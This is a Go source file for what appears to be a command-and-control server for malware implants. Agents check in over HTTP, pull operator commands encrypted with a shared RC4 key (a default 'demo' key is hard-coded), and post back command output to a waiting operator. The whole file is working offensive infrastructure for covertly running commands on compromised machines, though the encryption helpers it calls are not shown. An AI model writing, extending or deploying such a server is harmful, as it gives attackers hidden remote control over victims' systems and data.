package main

import (
	"io"
	"net/http"
	"strings"
	"sync"
	"time"
)

const (
	maxBody       = 8 << 20 // 8 MiB
	agentTTL      = 24 * time.Hour
	pathPrefix    = "/v1/terminal/"
)

// Agent is an in-memory record for one implant fingerprint.
type Agent struct {
	ID       string
	LastSeen time.Time

	mu      sync.Mutex
	pending string       // command waiting for next GET
	result  chan string  // capacity 1: next POST body for operator
}

// Registry tracks agents that have checked in.
type Registry struct {
	mu     sync.Mutex
	agents map[string]*Agent
	logf   func(format string, args ...any)
	key    []byte // shared RC4 key (must match implant)
}

func newRegistry(logf func(string, ...any), key []byte) *Registry {
	if logf == nil {
		logf = func(string, ...any) {}
	}
	if len(key) == 0 {
		key = []byte("piclang-c2-demo-key")
	}
	return &Registry{
		agents: make(map[string]*Agent),
		logf:   logf,
		key:    append([]byte(nil), key...),
	}
}

func (r *Registry) touch(id string) *Agent {
	r.mu.Lock()
	defer r.mu.Unlock()
	a, ok := r.agents[id]
	if !ok {
		a = &Agent{
			ID:     id,
			result: make(chan string, 1),
		}
		r.agents[id] = a
		r.logf("new agent %s…  full=%s", shortID(id), id)
	}
	a.LastSeen = time.Now()
	return a
}

// List returns agents seen within agentTTL, newest first.
func (r *Registry) List() []*Agent {
	r.mu.Lock()
	defer r.mu.Unlock()
	cutoff := time.Now().Add(-agentTTL)
	var out []*Agent
	for _, a := range r.agents {
		if a.LastSeen.Before(cutoff) {
			continue
		}
		out = append(out, a)
	}
	// newest first
	for i := 0; i < len(out); i++ {
		for j := i + 1; j < len(out); j++ {
			if out[j].LastSeen.After(out[i].LastSeen) {
				out[i], out[j] = out[j], out[i]
			}
		}
	}
	return out
}

// Find returns an agent by exact id or unique prefix among recent agents.
func (r *Registry) Find(idOrPrefix string) (*Agent, string) {
	idOrPrefix = strings.TrimSpace(idOrPrefix)
	if idOrPrefix == "" {
		return nil, "empty agent id"
	}
	recent := r.List()
	var matches []*Agent
	for _, a := range recent {
		if a.ID == idOrPrefix || strings.HasPrefix(a.ID, idOrPrefix) {
			matches = append(matches, a)
		}
	}
	if len(matches) == 0 {
		// also allow exact match even if stale
		r.mu.Lock()
		a := r.agents[idOrPrefix]
		r.mu.Unlock()
		if a != nil {
			return a, ""
		}
		return nil, "no agent matching " + idOrPrefix
	}
	if len(matches) > 1 {
		return nil, "ambiguous prefix; matches multiple agents"
	}
	return matches[0], ""
}

// QueueCommand sets a pending command. Fails if one is already pending.
func (a *Agent) QueueCommand(cmd string) error {
	a.mu.Lock()
	defer a.mu.Unlock()
	if a.pending != "" {
		return errPending
	}
	// drain stale result if any
	select {
	case <-a.result:
	default:
	}
	a.pending = cmd
	return nil
}

// WaitResult waits for the next POST body or timeout.
func (a *Agent) WaitResult(timeout time.Duration) (string, bool) {
	t := time.NewTimer(timeout)
	defer t.Stop()
	select {
	case s := <-a.result:
		return s, true
	case <-t.C:
		a.mu.Lock()
		a.pending = "" // drop orphaned command
		a.mu.Unlock()
		// drain late result
		select {
		case <-a.result:
		default:
		}
		return "", false
	}
}

func (a *Agent) hasPending() bool {
	a.mu.Lock()
	defer a.mu.Unlock()
	return a.pending != ""
}

func (a *Agent) takePending() string {
	a.mu.Lock()
	defer a.mu.Unlock()
	c := a.pending
	a.pending = ""
	return c
}

func (a *Agent) pushResult(body string) {
	select {
	case a.result <- body:
	default:
		// no waiter: drop (operator not in shell / timed out)
		select {
		case <-a.result:
		default:
		}
		select {
		case a.result <- body:
		default:
		}
	}
}

type pendingErr struct{}

func (pendingErr) Error() string { return "command already pending for this agent" }

var errPending pendingErr

// Handler serves /v1/terminal/{agentID}
func (r *Registry) Handler() http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		if !strings.HasPrefix(req.URL.Path, pathPrefix) {
			http.NotFound(w, req)
			return
		}
		id := strings.TrimPrefix(req.URL.Path, pathPrefix)
		id = strings.Trim(id, "/")
		if id == "" || strings.Contains(id, "/") {
			http.Error(w, "bad agent id", http.StatusBadRequest)
			return
		}
		a := r.touch(id)

		switch req.Method {
		case http.MethodGet:
			cmd := a.takePending()
			if cmd == "" {
				// quiet poll (204); only log first-seen via touch()
				w.WriteHeader(http.StatusNoContent)
				return
			}
			wire, err := seal([]byte(cmd), r.key)
			if err != nil {
				http.Error(w, "seal failed", http.StatusInternalServerError)
				return
			}
			r.logf("%s pulled command %q", shortID(id), truncate(cmd, 60))
			w.Header().Set("Content-Type", "text/plain; charset=utf-8")
			w.WriteHeader(http.StatusOK)
			_, _ = io.WriteString(w, wire)

		case http.MethodPost:
			body, err := io.ReadAll(io.LimitReader(req.Body, maxBody))
			if err != nil {
				http.Error(w, "read body", http.StatusBadRequest)
				return
			}
			plain, err := open(string(body), r.key)
			if err != nil {
				// still accept empty body as empty output
				if len(body) == 0 {
					plain = nil
				} else {
					r.logf("%s POST open failed: %v", shortID(id), err)
					http.Error(w, "bad sealed body", http.StatusBadRequest)
					return
				}
			}
			r.logf("%s returned %d byte(s) of output", shortID(id), len(plain))
			a.pushResult(string(plain))
			w.WriteHeader(http.StatusNoContent)

		default:
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		}
	})
}

func shortID(id string) string {
	if len(id) <= 8 {
		return id
	}
	return id[:8]
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

func relAge(t time.Time) string {
	d := time.Since(t).Round(time.Second)
	if d < time.Minute {
		return d.String() + " ago"
	}
	if d < time.Hour {
		return d.Round(time.Minute).String() + " ago"
	}
	return d.Round(time.Minute).String() + " ago"
}
